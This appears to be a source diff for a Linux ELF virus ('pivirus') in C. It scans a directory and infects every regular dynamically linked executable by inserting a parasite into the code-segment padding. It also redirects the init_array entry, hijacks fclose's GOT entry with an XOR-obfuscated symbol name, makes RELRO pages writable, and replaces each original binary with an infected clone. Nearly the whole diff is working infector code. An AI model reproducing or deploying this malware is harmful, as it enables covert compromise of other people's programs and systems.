@@ -477,3 +477,466 @@ inline_function void pi_xor_mem(void *mem,uint64_t len,uint8_t xor_key)
     while (len--) *((uint8_t *)mem++) ^= xor_key;
 }
 
+
+
+int64_t pi_check_target(void)
+{
+    Elf64_Ehdr *ehdr;
+    Elf64_Phdr *phdr;
+    char elfmag[] = ELFMAG;
+    uint64_t dyn_linked = 0;
+
+
+    target_elf->fd = pi_open(target_elf->name,O_RDWR,0);
+    pi_check_syscall_fault(target_elf->fd);
+
+    pi_check_syscall_fault(pi_fstat(target_elf->fd,&target_elf->stat));
+
+    target_elf->mmap = pi_mmap(NULL,
+                               target_elf->stat.st_size,
+                               PROT_READ | PROT_WRITE,
+                               MAP_SHARED,
+                               target_elf->fd,
+                               0);
+    pi_check_syscall_fault(target_elf->mmap);
+
+    ehdr = (Elf64_Ehdr *)target_elf->mmap;
+    phdr = (Elf64_Phdr *)(target_elf->mmap + ehdr->e_phoff);
+
+    if (pi_memcmp(target_elf->mmap,elfmag,SELFMAG) == MEM_NOT_EQUAL)
+        return PI_OPERATION_ERROR;
+    
+    //binary is infected before ? 
+    if (ehdr->e_ident[EI_OSABI] == PI_SIGNATURE)
+        return PI_OPERATION_ERROR;
+    
+    if (!((ehdr->e_type == ET_EXEC) || (ehdr->e_type == ET_DYN)))
+        return PI_OPERATION_ERROR;
+    
+    for (uint64_t i = 0; i < ehdr->e_phnum; ++i,++phdr)
+    {
+        if (phdr->p_type != PT_DYNAMIC)
+            continue;
+        dyn_linked = 1;
+    }
+
+    if (!dyn_linked)
+        return PI_OPERATION_ERROR;
+    
+    return PI_OPERATION_SUCCESS;
+}
+
+
+void pi_do_init(void)
+{
+    Elf64_Phdr  *tmp_phdr;
+    Elf64_Shdr  *tmp_shdr;
+    Elf64_Dyn   *tmp_dynseg;
+    Elf64_Sym   *tmp_dynsym;
+    Elf64_Addr  target_code_vaddr, target_data_vaddr;
+    Elf64_Off   target_code_offset, target_data_offset;
+
+    target_elf->elfstructs.ehdr = (Elf64_Ehdr *)target_elf->mmap;
+    target_elf->elfstructs.phdr = (Elf64_Phdr *)(target_elf->mmap + target_elf->elfstructs.ehdr->e_phoff);
+    target_elf->elfstructs.shdr = (Elf64_Shdr *)(target_elf->mmap + target_elf->elfstructs.ehdr->e_shoff);
+
+
+    tmp_phdr = target_elf->elfstructs.phdr;
+    for (Elf64_Half i = 0; i < target_elf->elfstructs.ehdr->e_phnum; ++i, ++tmp_phdr)
+    {
+        switch (tmp_phdr->p_type)
+        {
+            case PT_LOAD:
+                if (tmp_phdr->p_flags & PF_X)
+                {
+                    target_elf->loadsegments.code_vaddr   = tmp_phdr->p_vaddr;
+                    target_elf->loadsegments.code_offset  = tmp_phdr->p_offset;
+                    target_elf->loadsegments.code_size    = tmp_phdr->p_memsz;
+                    target_elf->elfstructs.textphdr       = tmp_phdr;
+                
+                    target_code_vaddr  = target_elf->loadsegments.code_vaddr;
+                    target_code_offset = target_elf->loadsegments.code_offset;
+                
+                }
+                target_elf->loadsegments.data_vaddr  = tmp_phdr->p_vaddr;
+                target_elf->loadsegments.data_offset = tmp_phdr->p_offset;
+
+                target_data_vaddr  = target_elf->loadsegments.data_vaddr;
+                target_data_offset = target_elf->loadsegments.data_offset;
+                break;
+
+            case PT_DYNAMIC:
+                target_elf->elfstructs.dynseg = (Elf64_Dyn *)(target_elf->mmap + tmp_phdr->p_offset);
+                break;
+            
+            case PT_GNU_RELRO:
+                target_elf->elfstructs.gnureloc_sz    = tmp_phdr->p_memsz;
+                target_elf->elfstructs.gnureloc_start = tmp_phdr->p_vaddr - target_elf->elfstructs.textphdr->p_vaddr;
+                break;
+        }
+    }
+
+    tmp_dynseg = target_elf->elfstructs.dynseg;
+    for (; tmp_dynseg->d_tag != DT_NULL; ++tmp_dynseg)
+    {
+        switch (tmp_dynseg->d_tag)
+        {
+            case DT_SYMTAB:
+                target_elf->elfstructs.dyn_symtab = (Elf64_Sym *)(target_elf->mmap + target_code_offset +
+                                                                     (tmp_dynseg->d_un.d_ptr - target_code_vaddr));
+                break;
+
+            case DT_STRTAB:
+                target_elf->elfstructs.dyn_strtab = target_elf->mmap + target_code_offset +
+                                                                    (tmp_dynseg->d_un.d_ptr - target_code_vaddr);
+                break;
+
+            case DT_JMPREL:
+                target_elf->elfstructs.pltrela = (Elf64_Rela *)(target_elf->mmap + target_code_offset +
+                                                                    (tmp_dynseg->d_un.d_ptr - target_code_vaddr));
+                break;
+
+            case DT_PLTGOT:
+                target_elf->elfstructs.pltgot = (Elf64_Addr *)(target_elf->mmap + target_data_offset + 
+                                                                    (tmp_dynseg->d_un.d_ptr - target_data_vaddr));
+            case DT_RELA:
+                target_elf->elfstructs.rela = (Elf64_Rela *)(target_elf->mmap + target_code_offset + 
+                                                                    (tmp_dynseg->d_un.d_ptr - target_code_vaddr));
+                break;
+
+            case DT_RELASZ:
+                target_elf->elfstructs.relasz = tmp_dynseg->d_un.d_val;
+                break;
+
+            case DT_PLTRELSZ:
+                target_elf->elfstructs.pltrelsz = tmp_dynseg->d_un.d_val;
+                break;
+
+            case DT_FLAGS_1:
+                if (tmp_dynseg->d_un.d_val & DF_1_NOW)
+                    ++target_elf->elf_flags.bind_now;
+                break;
+
+            case DT_INIT_ARRAY:
+                target_elf->elfstructs.initarray = (Elf64_Addr *)(target_elf->mmap + (tmp_dynseg->d_un.d_ptr -
+                                                                                           target_data_vaddr + target_data_offset));
+                break;
+        }
+    }
+
+    target_elf->hostilefunc.hostile_addr = (uint64_t)pi_hostile_fclose;
+    target_elf->hostilefunc.hostile_len  = pi_get_hostile_len();
+
+}
+
+
+int32_t pi_symbol_lookup(void)
+{
+    char *dynstrtab;
+    char *sym_name;
+    Elf64_Rela  *rel;
+    Elf64_Xword relsz;
+    Elf64_Sym   *dynsymtab;
+        
+
+    if (target_elf->elf_flags.bind_now && !target_elf->elfstructs.pltrela)
+    {
+        rel     = target_elf->elfstructs.rela;
+        relsz   = target_elf->elfstructs.relasz;
+
+    }else
+    {
+        rel     = target_elf->elfstructs.pltrela;
+        relsz   = target_elf->elfstructs.pltrelsz;
+    }
+
+
+    dynsymtab = target_elf->elfstructs.dyn_symtab;
+    dynstrtab = target_elf->elfstructs.dyn_strtab;
+
+    target_elf->targetfunc.func_name_len = pi_strlen(fclose_xor_encoded);
+    target_elf->targetfunc.func_name     = pi_malloc(target_elf->targetfunc.func_name_len);
+
+    pi_memcpy(target_elf->targetfunc.func_name,
+              fclose_xor_encoded,
+              target_elf->targetfunc.func_name_len);
+
+    pi_xor_mem(target_elf->targetfunc.func_name,
+               target_elf->targetfunc.func_name_len,
+               PI_XOR_KEY);
+
+    
+    for (Elf64_Xword i = 0; i < (relsz / sizeof(Elf64_Rela)); ++i, ++rel)
+    {
+        sym_name = &dynstrtab[dynsymtab[ELF64_R_SYM(rel->r_info)].st_name];
+        if (pi_memcmp(sym_name,target_elf->targetfunc.func_name,target_elf->targetfunc.func_name_len) == MEM_EQUAL)
+                target_elf->targetfunc.func_got = (Elf64_Addr)rel->r_offset;
+    }
+
+    pi_free(target_elf->targetfunc.func_name);
+
+    if (!target_elf->targetfunc.func_got)
+        return PI_OPERATION_ERROR;
+
+    return PI_OPERATION_SUCCESS;
+}
+
+
+
+/*
+ * flcose's GOT entry hijacking is done @ runtime with the following algorithm:
+ *      - let r be any register
+ *      - (r) holds hostile function address
+ *      - [ fclose_got_entry_offset + rip ]  <- r , let this instruction's address be #modify_got
+ *      - [ addr ] is the address of the next instruction that modifies the GOT entry (the next to [#modify_got])
+ *      - [ diff ] is the offset between the target GOT entry and [ addr ]
+ *
+ *      - so it will be like this
+ *         - mov $address_of_hostile, diff(%rip) 
+ *
+ * the parasite takes care of ELF binaries that have the BIND_NOW flag so the entry of the parasite
+ * mprotects the GNU_RELRO PAGES to be writeable  
+*/
+
+void pi_edit_parasite(void)
+{
+    uint64_t diff, addr, var1, var2, var3;
+
+    var1 = target_elf->loadsegments.code_size + PARASITE_ENTRY_SIZE;
+
+    var2 = PAGE_ALIGN_LOW(target_elf->elfstructs.gnureloc_start);
+
+    var3 = target_elf->elfstructs.gnureloc_sz;
+
+    addr = target_elf->loadsegments.code_vaddr + 
+                        target_elf->loadsegments.code_size + 
+                                                    PARASITE_OFFSET_5;
+
+    diff = target_elf->targetfunc.func_got - addr;
+
+    *((uint32_t *)&parasite[PARASITE_OFFSET_1]) = (uint32_t)var1;
+    *((uint32_t *)&parasite[PARASITE_OFFSET_2]) = (uint32_t)var2;
+    *((uint32_t *)&parasite[PARASITE_OFFSET_3]) = (uint32_t)var3;
+    *((uint32_t *)&parasite[PARASITE_OFFSET_4]) = (uint32_t)diff;
+}
+
+int64_t pi_create_infected_clone(void)
+{
+    char     tmpfile[] = "/tmp/.tmp.PI314X_OC";
+    char     buf[PAGE_SIZE];
+    int64_t  tmpfile_fd, syscall_ret;
+    int64_t  infected_clone_mode, tmpfile_mode;
+    uint64_t buf1_sz, buf2_sz, buf3_sz;
+    
+    //mark binary as infected
+    target_elf->elfstructs.ehdr->e_ident[EI_OSABI] = PI_SIGNATURE;
+
+    tmpfile_mode        = S_IRUSR | S_IWUSR;
+    infected_clone_mode = tmpfile_mode | S_IXUSR;
+    
+    tmpfile_fd = pi_open(tmpfile,O_CREAT | O_RDWR,tmpfile_mode);
+    pi_check_syscall_fault(tmpfile_fd);
+
+    buf1_sz = target_elf->loadsegments.code_offset + 
+                        target_elf->loadsegments.code_size + 
+                                target_elf->filehole;
+    
+    buf2_sz = ( PARASITE_LEN + target_elf->hostilefunc.hostile_len ) > target_elf->filehole ? PAGE_SIZE : 0;
+    
+    buf3_sz = target_elf->stat.st_size - buf1_sz;
+
+    syscall_ret = pi_write(tmpfile_fd,target_elf->mmap,buf1_sz);
+    pi_check_syscall_fault(syscall_ret);
+
+    syscall_ret = pi_write(tmpfile_fd,buf,buf2_sz);
+    pi_check_syscall_fault(syscall_ret);
+
+    syscall_ret = pi_write(tmpfile_fd,target_elf->mmap + buf1_sz,buf3_sz);
+    pi_check_syscall_fault(syscall_ret);
+
+    syscall_ret = pi_lseek(tmpfile_fd,
+                           target_elf->loadsegments.code_offset + 
+                           target_elf->loadsegments.code_size,
+                           SEEK_SET);
+    pi_check_syscall_fault(syscall_ret);
+
+    syscall_ret = pi_write(tmpfile_fd,parasite,PARASITE_LEN);
+    pi_check_syscall_fault(syscall_ret);
+
+    syscall_ret = pi_write(tmpfile_fd,
+                          (const char *)target_elf->hostilefunc.hostile_addr,
+                          target_elf->hostilefunc.hostile_len);
+    pi_check_syscall_fault(syscall_ret);
+
+    syscall_ret = pi_close(tmpfile_fd);
+    pi_check_syscall_fault(syscall_ret);
+
+    syscall_ret = pi_chmod(tmpfile,infected_clone_mode);
+    pi_check_syscall_fault(syscall_ret);
+
+    syscall_ret = pi_rename(tmpfile,target_elf->name);
+    pi_check_syscall_fault(syscall_ret);
+
+    return PI_OPERATION_SUCCESS;
+}
+
+void pi_infect_target(void)
+{
+    Elf64_Phdr  *elfphdr;
+    Elf64_Shdr  *elfshdr;
+    Elf64_Rela  *elfrela;
+    Elf64_Addr  target_code_vaddr, target_data_vaddr;
+    Elf64_Off   target_code_offset, target_data_offset;
+    Elf64_Xword target_code_size, target_data_size;
+    uint64_t    flag, parasite_len, off, addr;
+    uint8_t old_osabi;
+
+    if (pi_check_target() == PI_OPERATION_ERROR)
+        goto target_cleanup;
+
+    pi_do_init();
+
+    if (pi_symbol_lookup() == PI_OPERATION_ERROR)
+        goto target_cleanup;
+
+
+    elfphdr = target_elf->elfstructs.phdr;
+    elfshdr = target_elf->elfstructs.shdr;
+    elfrela = target_elf->elfstructs.rela;
+
+    target_code_vaddr  = target_elf->loadsegments.code_vaddr;
+    target_data_vaddr  = target_elf->loadsegments.data_vaddr;
+
+    target_code_offset = target_elf->loadsegments.code_offset;
+    target_data_offset = target_elf->loadsegments.data_offset;
+
+    target_code_size   = target_elf->loadsegments.code_size;
+    target_data_size   = target_elf->loadsegments.data_size;
+
+    flag         = 1;
+    parasite_len = PARASITE_LEN;
+
+    if ((parasite_len  + target_elf->hostilefunc.hostile_len) > 
+             (PAGE_SIZE - VADDR_OFFSET(target_code_vaddr + target_code_size)))
+        return;
+
+
+    for (Elf64_Half i = 0; i < target_elf->elfstructs.ehdr->e_phnum; ++i, ++elfphdr)
+    {
+        if (elfphdr->p_offset > (target_code_offset + target_code_size))
+        {
+            if (flag)
+            {
+                target_elf->filehole = elfphdr->p_offset - (target_code_offset + target_code_size);
+                --flag;
+            }
+            if ((parasite_len + target_elf->hostilefunc.hostile_len) > target_elf->filehole)
+                elfphdr->p_offset += PAGE_SIZE;
+        }
+    }
+    
+    if (target_elf->elfstructs.shdr)
+    {
+        for (Elf64_Half i = 0; i < target_elf->elfstructs.ehdr->e_shnum; ++i, ++elfshdr)
+        {
+            if ((elfshdr->sh_offset + elfshdr->sh_size) == (target_code_offset + target_code_size))
+                elfshdr->sh_size += parasite_len;
+
+            if (elfshdr->sh_offset > (target_code_offset + target_code_size))
+            {
+                if ((parasite_len + target_elf->hostilefunc.hostile_len) > target_elf->filehole)
+                    elfshdr->sh_offset += PAGE_SIZE;
+            }
+        }
+        if ((parasite_len + target_elf->hostilefunc.hostile_len) > target_elf->filehole)
+            target_elf->elfstructs.ehdr->e_shoff += PAGE_SIZE;
+    }
+
+    /*
+     * - pivirus doesn't alter the original entry point of the target , instead the entry in the init array section that
+     *   corresponds to frame dummy function's address is overwritten with the address of the parasite's entry point
+     * 
+     * - for ET_DYN binaries there will be a relocation entry for every entry in the init array section with the r_addend member
+     *   of the relocation entry holding the offset of the function in the binary, so the dynamic linker will add the loading
+     *   address of the binary to r_addend value and modify the  init array section's entry @ r_offset
+     */
+    if (target_elf->elfstructs.ehdr->e_type == ET_DYN)
+    {
+        for (uint64_t i = 0; i < (target_elf->elfstructs.relasz / sizeof(Elf64_Rela)); ++i, ++elfrela)
+        {
+            if (ELF64_R_TYPE(elfrela->r_info) == R_X86_64_RELATIVE)
+            {
+                if (elfrela->r_addend == (Elf64_Sxword)(target_elf->elfstructs.initarray[0]))
+                {
+                    elfrela->r_addend = (Elf64_Sxword)(target_code_vaddr + target_code_size);
+                    break;
+                }
+            }
+        }
+    }
+    *target_elf->elfstructs.initarray = target_code_vaddr + target_code_size;
+
+    target_elf->elfstructs.textphdr->p_memsz  += parasite_len + target_elf->hostilefunc.hostile_len;
+    target_elf->elfstructs.textphdr->p_filesz += parasite_len + target_elf->hostilefunc.hostile_len;
+
+    pi_edit_parasite();
+    
+    old_osabi = target_elf->elfstructs.ehdr->e_ident[EI_OSABI];
+
+    if (pi_create_infected_clone() == PI_OPERATION_ERROR)
+        target_elf->elfstructs.ehdr->e_ident[EI_OSABI] = old_osabi; //infection fails so unmark the binary
+
+target_cleanup:
+    pi_munmap((uint64_t)target_elf->mmap,target_elf->stat.st_size);
+    pi_close(target_elf->fd);
+}
+
+int32_t pi(const char *target_dir)
+{
+    char dirents_buf[DIRENTS_BUF_SIZE];
+    int64_t fd, nread, syscall_ret;
+    linux_dirent64_t *dir;
+   
+    syscall_ret = pi_chdir(target_dir);
+    pi_check_syscall_fault(syscall_ret);
+
+    fd = pi_open(target_dir,O_RDONLY | O_DIRECTORY,0);
+    pi_check_syscall_fault(fd);
+
+    if (pi_mm_getpool() == PI_OPERATION_ERROR)
+        return PI_OPERATION_ERROR;
+
+    for (;;)
+    {
+        nread = pi_getdents64(fd,dirents_buf,DIRENTS_BUF_SIZE);
+        pi_check_syscall_fault(nread);
+
+        if (nread == 0)
+            break;
+
+        for (uint64_t pos = 0, i = 0; pos < nread; ++i, pos += dir->d_reclen)
+        {
+            dir = (struct linux_dirent64 *)(dirents_buf + pos);
+
+            if (dir->d_type == DT_REG)
+            {
+
+                target_elf = pi_malloc(sizeof(target_elf_t));
+                
+                target_elf->name = dir->d_name;
+                
+                pi_infect_target();
+
+                pi_free(target_elf);
+            }
+        }
+    }
+
+    return PI_OPERATION_SUCCESS;
+}
+void _start(start_args_t start_args)
+{
+    pi(start_args.argv[1]);
+    pi_exit(0);
+}
+
